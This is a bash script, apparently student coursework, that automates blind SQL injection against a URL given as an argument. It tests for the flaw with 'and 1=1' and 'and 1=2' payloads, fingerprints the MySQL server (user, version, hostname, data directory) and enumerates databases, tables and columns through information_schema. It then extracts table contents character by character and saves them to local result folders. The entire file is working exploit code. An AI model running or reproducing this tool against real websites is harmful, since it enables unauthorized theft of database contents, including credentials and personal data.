#!/bin/bash

URL=$1

URL_IP=${URL:7}
U2="$( echo $URL_IP | sed -e 's/\//\-/g' -e 's/?.*//g' )"

echo_prinT() {
local name=$1

echo -n "#"

for ((i=0;i<$((${#name}+8));i++))
do
	echo -n "-"
done

echo "#"

echo -n "#----"
echo -ne "$name"
echo  "----#"

echo -n "#"

for ((j=0;j<$((${#name}+8));j++))
do
	echo -n "-"
done

echo  "#"

return 0

}


#echo $URL_NOPRO

#echo "#----------------------------------------------------------------------------------------------#"
#echo "#--------------------------------Blind SQL INJECTION Section-----------------------------------#"
#echo "#----------------------------------------------------------------------------------------------#"
echo_prinT "Blind SQL INJECTION Section"
echo

#----------------------------------------------------------------------------------------------#
################################################################################################
#----------------------------------------------------------------------------------------------#
#--------------------------------------Test Case #1--------------------------------------------#
#----------------------------------------------------------------------------------------------#
#echo "[info]  #>># Test-Case #1 Checking Vulnerability" 

echo_prinT "Test-Case #1 Checking Vulnerability"


Check_Existance_of_BlinSQL="$(diff <(w3m "$1"" and 1=1#") <(w3m "$1"" and 1=2#")|wc -l)" 

if [ $Check_Existance_of_BlinSQL != 0 ]
then
	echo
	echo "[***]  SUCCESS: Potentially vulnerable to Blind SQL"
	echo
else
	echo
	echo "[***]  FAILURE: Not Potentially vulnerable to Blind SQL"
	echo
	exit
fi
#----------------------------------------------------------------------------------------------#
################################################################################################
#----------------------------------------------------------------------------------------------#
#--------------------------------------Test Case #2--------------------------------------------#
#----------------------------------------------------------------------------------------------#
#echo "[info]  Test-Case #2 Database Finger Print" 
echo_prinT "Test-Case #2 Database Finger Print"

echo
Normal_Payload=" and 1=1;#"
NP="$(w3m -dump "$URL""$Normal_Payload"|wc -l)"


PAYLOAD_TAG=( "@@hostname" "user()" "CURRENT_USER" "database()" "version()" "@@datadir" "@@basedir" "@@socket" "UUID()" "UUID_SHORT()" "SYSDATE()" "CURDATE()" "CURTIME()" "NOW()" )
for (( p=0;p<${#PAYLOAD_TAG[@]};p++ ))
do
	
	echo -e "[info]  >#>#> Retriving Database ${PAYLOAD_TAG[$p]} >\n"

	echo "[info]  Retriving Database ${PAYLOAD_TAG[$p]} Number Of Characters :"
	echo -n "[info]  Retriving : "	
	for ((i=1;i<50;i++))
	do
		
		echo -n "."
		INJECT_PAYLOAD=" and LENGTH("${PAYLOAD_TAG[$p]}")="$i";#"
		INJECTED="$(w3m -dump "$URL""$INJECT_PAYLOAD" | wc -l)"	
		Check_Existance_of_BlinSQL="$(diff <(echo "$INJECTED") <(echo "$NP") |wc -l)" 
		if [ $Check_Existance_of_BlinSQL = 0 ]
		then
			echo
			
			echo "[***]   SUCCESS: ${PAYLOAD_TAG[$p]} Lenght Retrived Equal : "$(($i))""
				
			echo "[info]  Retriving Database ${PAYLOAD_TAG[$p]} Name :"
 			echo -n "[info]  Retriving : "
			for ((j=1;j<"$(($i+1))";j++))
			do
				for ((k=32;k<=126;k++))
				do
					
					INJECT_PAYLOAD=" and 1=if(ASCII(substring("${PAYLOAD_TAG[$p]}",$j,1))=$k,1,0);#"
					
					INJECTED="$(w3m -dump "$URL""$INJECT_PAYLOAD" | wc -l)"				
					Check_Existance_of_BlinSQL="$(diff <(echo "$NP") <(echo "$(($INJECTED-1))") |wc -l)" 
					if [ $Check_Existance_of_BlinSQL = 0 ]
					then
						PAYLOAD_RESULT[$p]="${PAYLOAD_RESULT[$p]}""$(printf "\\$(printf '%03o' "$k")")"							
						break
					fi
				done
				echo -n "$(printf "\\$(printf '%03o' "$k")")"
			done
			
			break
		fi
	done
	echo
	
	echo "[***]   SUCCESS: DataBase ${PAYLOAD_TAG[$p]} is : ${PAYLOAD_RESULT[$p]} "
	echo
	echo
done

mkdir -vp ~/BSQL_RESULT/"URL:[$U2]"
echo
touch ~/BSQL_RESULT/"URL:[$U2]"/"FingerPrint.txt"
for ((i=0;i<${#PAYLOAD_TAG[@]};i++))
do
	echo "DataBase ${PAYLOAD_TAG[$i]} is : ${PAYLOAD_RESULT[$i]}" >> ~/BSQL_RESULT/"URL:[$U2]"/"FingerPrint.txt" 
done

################################################################################################
#####--------------------------------------------------------------------------------------#####
###------------------------------------Test Case #3------------------------------------------###
#----------------------------------------------------------------------------------------------#
URL="$1"

#echo "[info]  Test Case #3 Data Minning" 
echo_prinT "Test Case #3 Data Minning"
echo

DB_COUNT_Normal_Payload=" and 1=if(substr((SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name != 'mysql' AND schema_name != 'information_schema'  LIMIT 0,1),1,2)=0,1,0);# "
DB_COUNT_NP="$(w3m -dump "$URL""$DB_COUNT_Normal_Payload"|wc -l)"

echo "[info]  Retriving Number Of Databases in Schema >"
echo -n "[info]  Retriving :"
for ((DB_COUNTER_1=0;DB_COUNTER_1<100;DB_COUNTER_1++)) #To Find Number Of Databases
do
	echo -n "."
	DBCOUNT_INJECT_PAYLOAD=" and 1=if(substr((SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name != 'mysql' AND schema_name != 'information_schema'  LIMIT 0,1),1,2)=$DB_COUNTER_1,1,0);# "
	DBCOUNT_INJECTED="$(w3m -dump "$URL""$DBCOUNT_INJECT_PAYLOAD" | wc -l)"	
	DBCOUNT_Check_Existance_of_BlinSQL="$(diff <(echo "$DB_COUNT_NP") <(echo "$(($DBCOUNT_INJECTED))") |wc -l)"
	##
	
	if [ $DBCOUNT_Check_Existance_of_BlinSQL != 0 ]
	then	
		if [ $DB_COUNTER_1 == 0 ]
		then
			echo
			echo -e "[***]   SUCCESS: Number Of Databases Equal : "$(($DB_COUNTER_1))""
			
			break
		fi		
		echo 
		echo  "[***]   SUCCESS: Number Of Databases Equal : "$(($DB_COUNTER_1))"" 
		
		for ((DB_COUNTER_2=1;DB_COUNTER_2<=$DB_COUNTER_1;DB_COUNTER_2++))#To Loop between the databases 
		do		
			echo "[info]  Retriving Name Of Database Number #"$DB_COUNTER_2" >"
			echo -n "[info]  Retriving Database Name :"			
			for ((DB_COUNTER_3=1;DB_COUNTER_3<=50;DB_COUNTER_3++))#to find database name
			do
				for ((DB_COUNTER_4=32;DB_COUNTER_4<=126;DB_COUNTER_4++))#to find database letters
				do
					DB_INJECT_Normal_Payload=" and 1=if(ASCII(substr((select schema_name FROM information_schema.schemata WHERE schema_name != 'mysql' AND schema_name != 'information_schema' LIMIT $(($DB_COUNTER_2-1)),1),$DB_COUNTER_3,1))=200,1,0);# "
					DB_INJECT_NP="$(w3m -dump "$URL""$DB_INJECT_Normal_Payload"|wc -l)"

					DBNAME_INJECT_PAYLOAD=" and 1=if(ASCII(substr((select schema_name FROM information_schema.schemata WHERE schema_name != 'mysql' AND schema_name != 'information_schema' LIMIT $(($DB_COUNTER_2-1)),1),$DB_COUNTER_3,1))=$DB_COUNTER_4,1,0);# "
					DBNAME_INJECTED="$(w3m -dump "$URL""$DBNAME_INJECT_PAYLOAD" | wc -l)"	
					 
					DBNAME_Check_Existance_of_BlinSQL="$(diff <(echo "$DB_INJECT_NP") <(echo "$(($DBNAME_INJECTED))") |wc -l)" 
					if [ $DBNAME_Check_Existance_of_BlinSQL != 0 ] && [ $DB_COUNTER_4 != "127" ] 
					then
						DBNAME_PAYLOAD_RESULT[$DB_COUNTER_2]="${DBNAME_PAYLOAD_RESULT[$DB_COUNTER_2]}""$(printf "\\$(printf '%03o' "$DB_COUNTER_4")")"
						break
					fi
				done
				if [ $DB_COUNTER_4 == "127" ]
				then	
					DatabaseName[(($DB_COUNTER_2-1))]=${DBNAME_PAYLOAD_RESULT[$DB_COUNTER_2]}	
										
					echo -e "\n[***]   SUCCESS: Database "#$DB_COUNTER_2" IS : ${DBNAME_PAYLOAD_RESULT[$DB_COUNTER_2]}"		
					echo					
					mkdir -vp ~/BSQL_RESULT/"URL:[$U2]"/"HOST_NAME:[${PAYLOAD_RESULT[0]}]"/"USER_NAME:[${PAYLOAD_RESULT[1]}]"/"DATABASE_NAME:[${DBNAME_PAYLOAD_RESULT[$DB_COUNTER_2]}]"						
					echo					
					break
				else
					if [ $DB_COUNTER_4 == "127" ] && [ $DB_COUNTER_3 == "1" ]
					then	
						echo -e "\n[inifo]  FAILURE: Can't Retrive Database #"$DB_COUNTER_2" Name"
						DB_COUNTER_3=51									
						break
					fi
				fi
				echo  -n "$(printf "\\$(printf '%03o' "$DB_COUNTER_4")")"
			done	
			
		done
		break
	fi
	if [ $DB_COUNTER_1 == 99 ]
	then
		echo -e "\n[inifo]  FAILURE: Can't Retrive Number Of Databases "
		break
	fi
	
done


########################################################################################################################################################################################################
########################################################################################################################################################################################################
if [ ${#DatabaseName[@]} != 0 ]
then
	for ((TB_COUNTER_0=0;TB_COUNTER_0<${#DatabaseName[@]};TB_COUNTER_0++)) #To Find Number Of tables
	do
		TB_COUNT_Normal_Payload=" and 1=if(substr((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='"${DatabaseName[$TB_COUNTER_0]}"' LIMIT 0,1),1,2)=101,1,0);# "
		TB_COUNT_NP="$(w3m -dump "$URL""$TB_COUNT_Normal_Payload"|wc -l)"
		echo 
		echo "[info]  Retriving Number Of Tables in Database : ["${DatabaseName[$TB_COUNTER_0]}"] >"
		echo -n "[info]  Retriving :"
		for ((TB_COUNTER_1=0;TB_COUNTER_1<100;TB_COUNTER_1++)) #To Find Number Of tables
		do
			echo -n "."
			TB_COUNT_INJECT_PAYLOAD=" and 1=if(substr((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='"${DatabaseName[$TB_COUNTER_0]}"' LIMIT 0,1),1,2)=$TB_COUNTER_1,1,0);# "
			TB_COUNT_INJECTED="$(w3m -dump "$URL""$TB_COUNT_INJECT_PAYLOAD" | wc -l)"	
			TB_COUNT_Check_Existance_of_BlinSQL="$(diff <(echo "$TB_COUNT_NP") <(echo "$(($TB_COUNT_INJECTED))") |wc -l)"

			if [ $TB_COUNT_Check_Existance_of_BlinSQL != 0 ]
			then	
				if [ $TB_COUNTER_1 == 0 ]
				then
					echo
					echo -e "[***]    SUCCESS: Number Of Tables Equal : "$(($TB_COUNTER_1))""
				
					TableCount[$TB_COUNTER_0]=$TB_COUNTER_1
									
					break
				fi
				echo 
				echo  "[***]   SUCCESS: Number Of Tables Equal : "$(($TB_COUNTER_1))"" 
				
				TableCount[$TB_COUNTER_0]=$TB_COUNTER_1
				 
				for ((TB_COUNTER_2=1;TB_COUNTER_2<=$TB_COUNTER_1;TB_COUNTER_2++))#To Loop between the tables 
				do		
					
					echo "[info]  Retriving Name Of Table Number "$TB_COUNTER_2" >"
					echo -n "[info]  Retriving : "	
					for ((TB_COUNTER_3=1;TB_COUNTER_3<=50;TB_COUNTER_3++))#to find database name
					do
						for ((TB_COUNTER_4=32;TB_COUNTER_4<=126;TB_COUNTER_4++))#to find table letters
						do
							TB_INJECT_Normal_Payload=" and 1=if(ASCII(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = '"${DatabaseName[$TB_COUNTER_0]}"' LIMIT $(($TB_COUNTER_2-1)),1),$TB_COUNTER_3,1))=200,1,0);# "
							TB_INJECT_NP="$(w3m -dump "$URL""$TB_INJECT_Normal_Payload"|wc -l)"

							TB_NAME_INJECT_PAYLOAD=" and 1=if(ASCII(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = '"${DatabaseName[$TB_COUNTER_0]}"' LIMIT $(($TB_COUNTER_2-1)),1),$TB_COUNTER_3,1))=$TB_COUNTER_4,1,0);# "
							TB_NAME_INJECTED="$(w3m -dump "$URL""$TB_NAME_INJECT_PAYLOAD" | wc -l)"	
		 		
							TB_NAME_Check_Existance_of_BlinSQL="$(diff <(echo "$TB_INJECT_NP") <(echo "$(($TB_NAME_INJECTED))") |wc -l)" 
							if [ $TB_NAME_Check_Existance_of_BlinSQL != 0 ] && [ $TB_COUNTER_4 != "127" ]
							then
								TB_NAME_PAYLOAD_RESULT[$TB_COUNTER_2]="${TB_NAME_PAYLOAD_RESULT[$TB_COUNTER_2]}""$(printf "\\$(printf '%03o' "$TB_COUNTER_4")")"																			
								break
							fi
						done
						#echo "[info]  Retriving Table Name : ${TB_NAME_PAYLOAD_RESULT[$TB_COUNTER_2]}."
						if [ $TB_COUNTER_4 == "127" ]
						then
							TableName[$TB_COUNTER_0,(($TB_COUNTER_2-1))]=${TB_NAME_PAYLOAD_RESULT[$TB_COUNTER_2]}
							
							echo -e "\n[***]   SUCCESS: Table "#$TB_COUNTER_2" IS : ${TB_NAME_PAYLOAD_RESULT[$TB_COUNTER_2]}"
							
							mkdir -p ~/BSQL_RESULT/"URL:[$U2]"/"HOST_NAME:[${PAYLOAD_RESULT[0]}]"/"USER_NAME:[${PAYLOAD_RESULT[1]}]"/"DATABASE_NAME:[${DatabaseName[$TB_COUNTER_0]}]"/"TABLE_NAME:[${TB_NAME_PAYLOAD_RESULT[$TB_COUNTER_2]}]"
							echo								
							break
						else
							if [ $TB_COUNTER_4 == "127" ] && [ $TB_COUNTER_3 == "1" ]
							then	
								echo -e "\n[inifo]  FAILURE: Can't Retrive Table #"$TB_COUNTER_2" Name"
								TB_COUNTER_3=51									
								break
							fi
						fi
						echo  -n ""$(printf "\\$(printf '%03o' "$TB_COUNTER_4")")""
					done	
					
				done
				break
			fi
		done
	done
fi

######################################################################################################################################################################################################
######################################################################################################################################################################################################
if [ ${#DatabaseName[@]} != 0 ]
then
	for ((COL_COUNTER=0;COL_COUNTER<${#DatabaseName[@]};COL_COUNTER++)) #To Find Number Of tables
	do
		if [ ${TableCount[$COL_COUNTER]} != 0 ]
		then
			for ((COL_COUNTER_0=0;COL_COUNTER_0<${TableCount[$COL_COUNTER]};COL_COUNTER_0++)) #To Find Number Of tables
			do
				COL_COUNT_Normal_Payload=" and 1=if(substr((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_schema = '"${DatabaseName[$COL_COUNTER]}"' AND table_name = '"${TableName[$COL_COUNTER,$COL_COUNTER_0]}"' LIMIT 0,1),1,2)=101,1,0);# "
				COL_COUNT_NP="$(w3m -dump "$URL""$COL_COUNT_Normal_Payload"|wc -l)"
				#echo -e "\n[info]  Database "#$COL_COUNTER_0" IS : ${DatabaseName[$COL_COUNTER]}"				
				#echo -e "[info]  Table "#$COL_COUNTER_0" IS : ${TableName[$COL_COUNTER,$COL_COUNTER_0]}"
				echo
				echo "[info]  Retriving Number Of Columns in Database : "[${DatabaseName[$COL_COUNTER]}]" Table : "[${TableName[$COL_COUNTER,$COL_COUNTER_0]}]" >"
				echo -n "[info]  Retriving : "				
				for ((COL_COUNTER_1=1;COL_COUNTER_1<100;COL_COUNTER_1++)) #To Find Number Of Columns
				do
					echo -n "."
					COL_COUNT_INJECT_PAYLOAD=" and 1=if(substr((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_schema = '"${DatabaseName[$COL_COUNTER]}"' AND table_name = '"${TableName[$COL_COUNTER,$COL_COUNTER_0]}"' LIMIT 0,1),1,2)=$COL_COUNTER_1,1,0);# "
					COL_COUNT_INJECTED="$(w3m -dump "$URL""$COL_COUNT_INJECT_PAYLOAD" | wc -l)"
	
					COL_COUNT_Check_Existance_of_BlinSQL="$(diff <(echo "$COL_COUNT_NP") <(echo "$(($COL_COUNT_INJECTED))") |wc -l)"
	
					if [ $COL_COUNT_Check_Existance_of_BlinSQL != 0 ]
					then	
						if [ $COL_COUNTER_1 == 0 ]
						then
							echo
							echo "[***]   SUCCESS: Number Of Columns Equal : "$(($COL_COUNTER_1))""
							ColumnCount[$COL_COUNTER,$COL_COUNTER_0]=$COL_COUNTER_1
											
							break
						fi
						echo 
						echo  "[***]   SUCCESS: Number Of Columns Equal : "$(($COL_COUNTER_1))"" 
						
						ColumnCount[$COL_COUNTER,$COL_COUNTER_0]=$COL_COUNTER_1
						
					
						for ((COL_COUNTER_2=1;COL_COUNTER_2<=$COL_COUNTER_1;COL_COUNTER_2++))#To Loop between the Columns 
						do	
							echo
							echo "[info]  Retriving Name Of Column Number #"$COL_COUNTER_2" >"
							
							COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]=""
							echo -n "[info]  Retriving: "							
							for ((COL_COUNTER_3=1;COL_COUNTER_3<=50;COL_COUNTER_3++))#to find Column name
							do
								for ((COL_COUNTER_4=32;COL_COUNTER_4<=126;COL_COUNTER_4++))#to find Column letters
								do
									COL_INJECT_Normal_Payload=" and 1=if(ASCII(substr((SELECT column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_schema = '"${DatabaseName[$COL_COUNTER]}"' AND table_name = '"${TableName[$COL_COUNTER,$COL_COUNTER_0]}"' LIMIT $(($COL_COUNTER_2-1)),1),$COL_COUNTER_3,1))=200,1,0);# "
									COL_INJECT_NP="$(w3m -dump "$URL""$COL_INJECT_Normal_Payload"|wc -l)"
									COL_NAME_INJECT_PAYLOAD=" and 1=if(ASCII(substr((SELECT column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_schema = '"${DatabaseName[$COL_COUNTER]}"' AND table_name = '"${TableName[$COL_COUNTER,$COL_COUNTER_0]}"' LIMIT $(($COL_COUNTER_2-1)),1),$COL_COUNTER_3,1))=$COL_COUNTER_4,1,0);# "
									COL_NAME_INJECTED="$(w3m -dump "$URL""$COL_NAME_INJECT_PAYLOAD" | wc -l)"		
									COL_NAME_Check_Existance_of_BlinSQL="$(diff <(echo "$COL_INJECT_NP") <(echo "$(($COL_NAME_INJECTED))") |wc -l)" 
									if [ $COL_NAME_Check_Existance_of_BlinSQL != 0 ]
									then
										
										
										COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]="${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}""$(printf "\\$(printf '%03o' "$COL_COUNTER_4")")"
																		
										break
									fi
								done
								if [ $COL_COUNTER_4 == "127" ]
								then
									
																		
									ColumnName[$COL_COUNTER,$COL_COUNTER_0,(($COL_COUNTER_2-1))]=${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}
									
									echo -e "\n[***]   SUCCESS: Column "#$COL_COUNTER_2" IS : ${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}"
									echo

									touch ~/BSQL_RESULT/"URL:[$U2]"/"HOST_NAME:[${PAYLOAD_RESULT[0]}]"/"USER_NAME:[${PAYLOAD_RESULT[1]}]"/"DATABASE_NAME:[${DatabaseName[$COL_COUNTER]}]"/"TABLE_NAME:[${TableName[$COL_COUNTER,$COL_COUNTER_0]}]"/"[$COL_COUNTER_2]COLUMN_NAME:[${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}]"
									
									
###################################################################################################################################################################################################									
									
									COLDATA_COUNT_Normal_Payload=" and 1=if(substr((SELECT COUNT("${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}") FROM "${TableName[$COL_COUNTER,$COL_COUNTER_0]}"  LIMIT 0,1),1,2)=101,1,0);# "
									COLDATA_COUNT_NP="$(w3m -dump "$URL""$COLDATA_COUNT_Normal_Payload"|wc -l)"
									#w3m -dump "$URL""$COLDATA_COUNT_Normal_Payload"
									echo "[info]  Retriving Number Of Data in Database : "[${DatabaseName[$COL_COUNTER]}]" in Table : "[${TableName[$COL_COUNTER,$COL_COUNTER_0]}]" in Column : "[${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}]" >"
									echo -n "[info]  Retriving: "
									for ((COLDATA_COUNTER_1=0;COLDATA_COUNTER_1<100;COLDATA_COUNTER_1++)) #To Find Number Of Databases
									do
										echo -n "."
										COLDATACOUNT_INJECT_PAYLOAD=" and 1=if(substr((SELECT COUNT("${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}") FROM "${TableName[$COL_COUNTER,$COL_COUNTER_0]}"  LIMIT 0,1),1,2)=$COLDATA_COUNTER_1,1,0);# "
										COLDATACOUNT_INJECTED="$(w3m -dump "$URL""$COLDATACOUNT_INJECT_PAYLOAD" | wc -l)"
										#w3m -dump "$URL""$COLDATACOUNT_INJECT_PAYLOAD"	
										COLDATACOUNT_Check_Existance_of_BlinSQL="$(diff <(echo "$COLDATA_COUNT_NP") <(echo "$(($COLDATACOUNT_INJECTED))") |wc -l)"
										##
										#diff <(echo "$COLDATA_COUNT_NP") <(echo "$(($COLDATACOUNT_INJECTED))")
										if [ $COLDATACOUNT_Check_Existance_of_BlinSQL != 0 ]
										then	
											if [ $COLDATA_COUNTER_1 == 0 ]
											then
												echo
												echo -e "[***]   SUCCESS: Number Of Data Equal : "$(($COLDATA_COUNTER_1))""
												break
											fi		
											echo 
											echo  "[***]   SUCCESS: Number Of Data Equal : "$(($COLDATA_COUNTER_1))"" 
											for ((COLDATA_COUNTER_2=1;COLDATA_COUNTER_2<=$COLDATA_COUNTER_1;COLDATA_COUNTER_2++))#To Loop between the databases 
											do	 
												echo "[info]  Retriving Data Number #"$COLDATA_COUNTER_2" >"
												COLDATANAME_PAYLOAD_RESULT[$COLDATA_COUNTER_2]=""
												echo -n "[info]  Retriving: "												
												for ((COLDATA_COUNTER_3=1;COLDATA_COUNTER_3<=50;COLDATA_COUNTER_3++))#to find database name
												do
													for ((COLDATA_COUNTER_4=32;COLDATA_COUNTER_4<=126;COLDATA_COUNTER_4++))#to find database letters
													do
														COLDATA_INJECT_Normal_Payload=" and 1=if(ASCII(substr((SELECT "${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}" FROM "${TableName[$COL_COUNTER,$COL_COUNTER_0]}" LIMIT $(($COLDATA_COUNTER_2-1)),1),$COLDATA_COUNTER_3,1))=200,1,0);# "
														COLDATA_INJECT_NP="$(w3m -dump "$URL""$COLDATA_INJECT_Normal_Payload"|wc -l)"

														COLDATANAME_INJECT_PAYLOAD=" and 1=if(ASCII(substr((SELECT "${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}" FROM "${TableName[$COL_COUNTER,$COL_COUNTER_0]}" LIMIT $(($COLDATA_COUNTER_2-1)),1),(($COLDATA_COUNTER_3)),1))=$COLDATA_COUNTER_4,1,0);# "
														COLDATANAME_INJECTED="$(w3m -dump "$URL""$COLDATANAME_INJECT_PAYLOAD" | wc -l)"	
														 
														COLDATANAME_Check_Existance_of_BlinSQL="$(diff <(echo "$COLDATA_INJECT_NP") <(echo "$(($COLDATANAME_INJECTED))") |wc -l)" 
														if [ $COLDATANAME_Check_Existance_of_BlinSQL != 0 ] && [ $COLDATA_COUNTER_4 != "127" ] 
														then
															COLDATANAME_PAYLOAD_RESULT[$COLDATA_COUNTER_2]="${COLDATANAME_PAYLOAD_RESULT[$COLDATA_COUNTER_2]}""$(printf "\\$(printf '%03o' "$COLDATA_COUNTER_4")")"
															break
														fi
													done
													if [ $COLDATA_COUNTER_4 == "127" ]
													then	
														COLDATAName[(($COLDATA_COUNTER_2-1))]=${COLDATANAME_PAYLOAD_RESULT[$COLDATA_COUNTER_2]}						
														echo -e "\n[***]   SUCCESS: Data "#$COLDATA_COUNTER_2" IS : ${COLDATANAME_PAYLOAD_RESULT[$COLDATA_COUNTER_2]}"			
														
														echo "${COLDATANAME_PAYLOAD_RESULT[$COLDATA_COUNTER_2]}"  >> ~/BSQL_RESULT/"URL:[$U2]"/"HOST_NAME:[${PAYLOAD_RESULT[0]}]"/"USER_NAME:[${PAYLOAD_RESULT[1]}]"/"DATABASE_NAME:[${DatabaseName[$COL_COUNTER]}]"/"TABLE_NAME:[${TableName[$COL_COUNTER,$COL_COUNTER_0]}]"/"[$COL_COUNTER_2]COLUMN_NAME:[${COL_NAME_PAYLOAD_RESULT[$COL_COUNTER_2]}]"
														break
													else
														if [ $COLDATA_COUNTER_4 == "127" ] && [ $COLDATA_COUNTER_3 == "0" ]
														then	
															echo -e "\n[inifo]  FAILURE: Can't Retrive Database #"$COLDATA_COUNTER_2" Name"
															COLDATA_COUNTER_3=51									
															break
														fi
													fi
													echo  -n "$(printf "\\$(printf '%03o' "$COLDATA_COUNTER_4")")"
												done	
			
											done
											break
										fi
										if [ $COLDATA_COUNTER_1 == 99 ]
										then
											echo -e "\n[inifo]  FAILURE: Can't Retrive Number Of Databases "
											break
										fi
	
									done
###################################################################################################################################################################################################
									break
								else
									if [ $COL_COUNTER_4 == "127" ] && [ $COL_COUNTER_3 == "1" ]
									then	
										echo -e "\n[inifo]  FAILURE: Can't Retrive Column #"$COL_COUNTER_2" Name"
										COL_COUNTER_3=51									
										break
									fi								
								fi
								echo -n "$(printf "\\$(printf '%03o' "$COL_COUNTER_4")")"
							done	
							
						done
						break
					fi
				done
			done
		fi
	done
fi

#### by Mohamed Ayman
### ITI_SA_37
